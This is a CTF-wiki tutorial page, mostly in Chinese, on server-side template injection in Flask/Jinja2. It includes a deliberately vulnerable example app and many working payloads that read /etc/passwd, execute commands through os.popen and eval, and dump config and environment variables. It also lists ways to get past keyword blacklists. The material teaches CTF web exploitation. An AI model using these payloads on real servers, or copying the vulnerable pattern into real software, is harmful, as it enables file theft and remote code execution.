# Flask ssti
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 



## FLASK模板（jinja2框架)

这可能是你将会碰到的最多的模板


弄懂这个是接下来几个模板的比较重要的基础。（所以可能会啰嗦）


模板基于python,可能是py2也可能是py3，貌似py2会多一点。



## Flask


如果渲染的模版内容受到用户的控制。。。。


```plain
from flask import Flask, request
from jinja2 import Template
app = Flask(__name__)
@app.route("/")
def index():
name = request.args.get('name', 'guest')
t = Template("Hello " + name)
return t.render()
if __name__ == "__main__":
app.run();
Plain Text
```



我们可以控制的参数显然是name


提交 ?name=guest.{{7*7}}


会发现被计算成了49


又或者是{{‘abcd’,upper()}}(本质上还是py)


会输出ABCD


下面开始加速：


py2:


```plain
#读文件：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
#写文件：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
Plain Text
```



py3:


#命令执行：


```plain
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
Plain Text
```



（py2包含的类py3一般都有，但是位置顺序不太一样，然后就是调用格式确实不太一样）


这里以py2为例：


flask函数解析：


```plain
__class__ 返回调用的参数类型
__bases__ 返回类型列表
__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
__subclasses__() 返回object的子类
__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
Plain Text
```



{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}（如果还记得的话{{}}是输出的意思）


所以这句话的逻辑是什么呢？


创建一个空字符，返回它的参数类型，寻找基类，找子类，选取第40个子类，调用其中的read函数。这也是一条逻辑链，flask的模板注入的核心就是这条逻辑链。或者被称之为沙盒逃逸：创建一个相对封闭的python沙盒环境，然后从某个位置开始找到最顶层，然后一步一步向下摸索，最后从沙箱中逃逸出去。

## FLASK流程

也可以叫小payload，下次找个基础点的，没过滤的题，可以好好试试。


```plain
函数解析
__class__ 返回调用的参数类型__bases__ 返回类型列表__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组__subclasses__() 返回object的子类__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
Plain Text
```



```plain
获取基本类:
''.__class__.__mro__[2]//mro找的会比base快作用类似
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8]//针对jinjia2/flask为[9]适用
Plain Text
```



```plain
获取基本类后，继续向下获取基本类(object)的子类
object.__subclasses__()
Plain Text
```



```plain
找到重载过的__init__类(在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)所谓重载，就是多个相同函数名的函数，根据传入的参数个数，参数类型而执行不同的功能。所以函数重载实质上是为了解决编程中参数可变不统一的问题。然后就是重载了那还怎么用嘛。
''.__class__.__mro__[2].__subclasses__()[99].__init__//对99个实例化<slot wrapper '__init__' of 'object' objects>''.__class__.__mro__[2].__subclasses__()[59].__init__<unbound method WarningMessage.__init__>
Plain Text
```



```plain
查看其引用__builtins__builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']
Plain Text
```






```plain
这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('F://GetFlag.txt').read()
Plain Text
```



至此一条逃逸链就构造了出来。


在比赛中其实有些函数还是蛮难找的，不知道该用哪些类所以会有一些常用的payload:


都是py2的：


读写文件：


```plain
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()    #将read() 修改为 write() 即为写文件
Plain Text
```



```plain
[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() #将read() 修改为 write() 即为写文件
Plain Text
```



命令执行：


```plain
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
Plain Text
```



```plain
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
Plain Text
```



```plain
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
Plain Text
```



```plain
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')
Plain Text
```



总的来说：


首先就是判断，是否存在ssti模板注入点


确定找到注入点之后，由于flask等ssti模板都是由python编写，我们又可以在上面执行代码，于是就能够在ssti上查找框架中所包含的类


找到某个类之后继续调用，找到子类，父类等


最后通过找到的类中可能包含的函数os.。。。。在服务器端执行代码即可。


```plain
.__class__.__mro__//找基类
.__class__.__mro__[0].__subclasses__()//基类中的子类
{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__}}//.init.globals来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。
.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()//基类中的子类中的某个函数，执行并且调用。
{{config.__class__.__init__.__globals__['os'].environ}}这个是关于配置文件的，有时候FLAG也会放在配置文件之中。
Plain Text
```



## 绕过姿势

欢迎补充


### 绕过中括号


```plain
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
Plain Text
```



```plain
使用gititem绕过。如原poc {{"".class.bases[0]}}绕过后{{"".class.bases.getitem(0)}}
Plain Text
```






pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值


### 过滤引号


```plain
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
Plain Text
```



### 过滤双下划线


```plain
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
Plain Text
```



这里用到的是request:(稍微解释一下)


`{{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&b=__mro__&c=__subclasses__}}`


```plain
如下为常用的request姿势request.args.x1      get传参request.values.x1    post传参request.cookiesrequest.form.x1     post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data          post传参    (Content-Type:a/b)request.json      post传json  (Content-Type:application/json)
Plain Text
```



在Flask的官方文档中是这样介绍request的：对于 Web 应用，与客户端发送给服务器的数据交互至关重要。在 Flask 中由全局的 request 对象来提供这些信息。


### 过滤了subclasses等字符


```plain
拼凑法
原poc{{"".class.bases[0].subclasses()}}
绕过{{"".class.bases[0]'subcla'+'sses'}}
Plain Text
```



### 过滤class


```plain
使用sessionpoc{{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}多个bases[0]是因为一直在向上找object类。使用mro就会很方便
Plain Text
```






### 过滤关键字


```plain
base64编码绕过(编码的话我隐约记得py3好像用不了)
__getattribute__使用实例访问属性时,调用该方法
例如被过滤掉__class__关键词
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
字符串拼接绕过
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
Plain Text
```



字符串拼接


**1、拼接**


"cla"+"ss"


**2、反转**


"__ssalc__"[::-1]


**3.ascii转换**


```plain
"{0:c}".format(97)='a'"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)='__class__'
Plain Text
```



**4、编码绕过**


```plain
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"对于python2的话，还可以利用base64进行绕过（所以我没记错）"__class__"==("X19jbGFzc19f").decode("base64")
Plain Text
```



**5.利用chr函数**


因为我们没法直接使用chr函数，所以需要通过__builtins__找到他


```plain
{% set chr=url_for.__globals__['__builtins__'].chr %}{{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
Plain Text
```



**6、在jinja2里面可以利用~进行拼接**


```plain
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}
Plain Text
```



**7、大小写转换**


前提是过滤的只是小写


```plain
""["__CLASS__".lower()]
Plain Text
```






以上是常见的思路。可是假设有一天，你碰到了这样的玩意，你该怎么做？


```plain
blacklist</br>   '.','[','\'','"',''\\','+',':','_',</br>   'chr','pop','class','base','mro','init','globals','get',</br>   'eval','exec','os','popen','open','read',</br>   'select','url_for','get_flashed_messages','config','request',</br>   'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9'</br>    </br>
Plain Text
```



所以下面讲一讲进阶操作。

## FLASK进阶操作

这里的重点还是过滤器。


### 全局搜索姿势


url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等


如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）


```plain
{{url_for.__globals__['current_app'].config.FLAG}}{{get_flashed_messages.__globals__['current_app'].config.FLAG}}{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
Python
```



这个就很类似是全局性的搜索，尤其是url_for:


***url_for()作用:***


*(1)给指定的函数构造 URL。*


*(2)访问静态文件(CSS / JavaScript 等)。 只要在你的包中或是模块的所在目录中创建一个名为 static 的文件夹，在应用中使用 /static 即可访问。*


get_flashed_message(闪现)


*返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。*


### 过滤器


```plain
Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is applied to the next.For example, {{ name|striptags|title }} will remove all HTML Tags from variable name and title-case theoutput (title(striptags(name))).
变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。
例如，{{ name|striptags|title }} 将删除变量名中的所有HTML标记，并将title大小写为输出(title(striptags(name)))。
Plain Text
```



故名思意，过滤某些东西，得到我们想要的东西，或者换句话说，就是像函数的某个东西。


1.**attr**


*Get an attribute of an object. foo|attr("bar") works like foo.bar just that always an attribute is returned and items are not looked up.*


获取变量的值


```plain
""|attr("__class__")相当于"".__class__
Plain Text
```



2.**format**





```plain
用法
{ "%s, %s!"|format(greeting, name) }}
那么我们想要调用__class__就可以用format了："%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)=='__class__'
""["%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)]
Plain Text
```



3.**first last random**


* Return the first item of a sequence.
* Return the last item of a sequence.
* Return a random item from the sequence.

random是能拿别的（只是要跑脚本），其他两个只能拿首尾


4.**join**


这个就很关键了，非常重要


```plain
Return a string which is the concatenation of the strings in the sequence. The separator between elements is anempty string per default, you can define it with the optional parameter:
{{ [1, 2, 3]|join('|') }}    -> 1|2|3
{{ [1, 2, 3]|join }}    -> 123It is also possible to join certain attributes of an object:
{{ users|join(', ', attribute='username') }}
Plain Text
```



看的出来，join用他的参数作为前面列表的分隔符


```plain
""[['__clas','s__']|join] 或者 ""[('__clas','s__')|join]
相当于
""["__class__"]
Plain Text
```



5.**lower**


```plain
""["__CLASS__"|lower]很像之前的upper()函数
Plain Text
```



6.**replace reverse**


我们可以利用替换和反转还原回我们要用的字符串了


```plain
"__claee__"|replace("ee","ss") 构造出字符串 "__class__""__ssalc__"|reverse 构造出 "__class__"
Plain Text
```



7.**string**


功能类似于python内置函数 str.


有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。


```plain
().__class__   出来的是<class 'tuple'>(().__class__|string)[0] 出来的是<
Plain Text
```



8.**select unique**


```plain
Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.If no test is specified, each object will be evaluated as a boolean.通过对每个对象应用测试并仅选择测试成功的对象来筛选对象序列。如果没有指定测试，则每个对象都将被计算为布尔值
Returns a list of unique items from the given iterable.
Plain Text
```



```plain
()|select|string结果如下<generator object select_or_reject at 0x0000022717FF33C0>
(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]
得到字符串"__class__"
Plain Text
```



9.**list**


```plain
转换成列表
更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了
只是单纯的字符串的话取单个字符方法有限
Plain Text
```



```plain
(()|select|string|list).pop(0)
Plain Text
```



10.**lipsum**


这个是之前学到的姿势。


***Lorem ipsum，中文又称“乱数假文”，****是指一篇常用于排版设计领域的拉丁文文章[1] ，主要的目的为测试文章或文字在不同字型、版型下看起来的效果，通常网站还没建设好时会出现这段文字*


这个过滤器也是起到了这样的作用，于是我们结合lipsum|string|list


就能拿到我们想要的数字。到这里，那个blacklist就应该是有足够的方法绕过了。












